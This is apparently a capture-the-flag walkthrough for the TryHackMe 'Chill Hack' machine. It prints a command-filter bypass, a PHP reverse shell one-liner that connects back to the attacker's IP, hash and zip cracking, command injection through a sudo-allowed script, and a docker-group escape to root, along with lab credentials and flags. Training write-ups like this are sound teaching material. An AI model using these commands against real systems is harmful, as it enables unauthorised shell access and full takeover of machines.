# Chill Hack
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* SSH
* Search Username
* Sudoers

Tools used
--
* nmap
* ffuf
* ssh
* wget

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.204.221
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
sudo nmap -sS -sC -sV 10.10.204.221 -p- -T5 -vvv

<SNIP>
Discovered open port 80/tcp on 10.10.204.221
Discovered open port 22/tcp on 10.10.204.221
Discovered open port 21/tcp on 10.10.204.221
<SNIP>
21/tcp    open     ftp          syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
<SNIP>
```
Let's access to FTP server:
```
ftp 10.10.204.221 -n
Connected to 10.10.204.221.
220 (vsFTPd 3.0.3)
ftp> user
(username) anonymous
331 Please specify the password.
Password: 
230 Login successful.
ftp> binary
200 Switching to Binary mode.
ftp> get note.txt
```
`note.txt` contains:
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
Let's fuzz the HTTP server:
```
ffuf -u http://10.10.204.221/FFUF -H 'Host: 10.10.204.221' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0)
 Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Acc
ept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://10.10.204.221/contact.ht
ml' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w $SECLISTS/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 685ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 38ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 39ms]
fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 40ms]
secret                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 36ms]
```
By vising `secret` page, we get a field we can use to execute OS commands.

If we type a command, we get a string "Are you a hacker?". For bypassing it, try to type `echo $(<command>)`, for example:
```
echo $(whoami)

www-data
```
Let's try to get a reverse shell. Run `nc -lvnp 4444` on your terminal and inside the website type:
```
echo $(php -r '$sock=fsockopen("10.18.98.39",4444);exec("sh <&3 >&3 2>&3");')
```
Note: we used PHP command because we checked by `echo $(php --version)` that `php` was installed, while Bash didn't work and Python was not installed.

## Phase 2: Foothold

Inside the reverse shell, run:
```
script /dev/null -c bash

ls -la /var/www/

total 16
drwxr-xr-x  4 root root 4096 Oct  3  2020 .
drwxr-xr-x 14 root root 4096 Oct  3  2020 ..
drwxr-xr-x  3 root root 4096 Oct  3  2020 files
drwxr-xr-x  8 root root 4096 Oct  3  2020 html
```

Let's explore `files` folder. Read the content of `index.php` and we will find:
```
<SNIP>
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
		}
<SNIP>
```
Currently, we cannot do much more, because these root credentials don't allow to access as root in the server.

The files in `/var/www/files` seem to be a new web service. So, inside our reverse shell, run:
```
php -S 0.0.0.0:8080
```
Now, by the browser, navigate to `http://10.10.204.221:8080` and we get a login page. We can bypass it by calling directly the PHP pages inside `/var/www/files` directory. Let's visit `http://10.10.204.221:8080/hacker.php`.

We land in a page with the following string:
```
You have reached this far.
Look in the dark! You will find your answer
```
We guess the "dark" could be referred to some hidden file inside the hacker JPEG image. Save it and run:
```
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Enter passphrase: <empty>
wrote extracted data to "backup.zip".
```
This archive is password-protected. Let's use John for cracking it:
```
zip2john backup.zip > zip.hash
```
In this case, edit `zip.hash` removing the name of the zip file and its content at the beginning and the end of the string in order that Hashcat or John can recognize this hash.

Let's crack it:
```
hashcat -a 0 -m 17200 zip.hash $SECLISTS/Passwords/Leaked-Databases/rockyou.txt
```
The cracked password is: `pass1word`. So:
```
unzip backup.zip

Archive:  backup.zip
[backup.zip] source_code.php password: pass1word
  inflating: source_code.php 
```
Inside `source_code.php` file, we can see:
```
if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                {
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
```
The decoded Base64 string for the password is: `!d0ntKn0wmYp@ssw0rd`. We can use Anurodh credentials for accessing to the server by SSH:
```
ssh 10.10.204.221 -l anurodh

anurodh@10.10.204.221's password: !d0ntKn0wmYp@ssw0rd
```
Currently we cannot do more, but we are inside the server and remember that we got some database information early in the `index.php` page of `/var/www/files` folder. So, let's try to connect to the database and see what we can find:
```
mysql -u root -p -h localhost webportal

Enter password: !@m+her00+@db

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+

mysql> use webportal
Database changed

mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+

mysql> DESCRIBE users;
+-----------+--------------+------+-----+---------+----------------+
| Field     | Type         | Null | Key | Default | Extra          |
+-----------+--------------+------+-----+---------+----------------+
| id        | int(11)      | NO   | PRI | NULL    | auto_increment |
| firstname | varchar(100) | YES  |     | NULL    |                |
| lastname  | varchar(100) | YES  |     | NULL    |                |
| username  | varchar(100) | YES  |     | NULL    |                |
| password  | varchar(100) | YES  |     | NULL    |                |
+-----------+--------------+------+-----+---------+----------------+

mysql> SELECT * FROM users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
```
These hashes are MD5. Let's crack them by using CrackStation and we get:
```
7e53614ced3640d5de23f111806cc4fd:masterpassword
686216240e5af30df0501e53c789a649:dontaskdonttell
```
I'm not sure if all these secrets are useful for us. Going back to our SSH session, run:
```
sudo -l

Matching Defaults entries for apaar on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User apaar may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
It means we can use `sudo` for running the specified command on behalf of `apaar` user. Furthermore, by analyzing `.helpline.sh` code, we can see that we can inject commands, so we can run commands on behalf of `apaar` user:
```
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
Hello user! I am test,  Please enter your message: cat /home/apaar/local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
Thank you for your precious time!
```
So, we got the user flag inside `local.txt`.

## Phase 3: Privilege Escalation

By running `id` command, we notice that `anurodh` user belongs to the docker group:
```
id

uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```
It means we can perform a privilege escalation by running:
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# whoami
root
```

Now we can get the root flag by `cat /root/proof.txt`.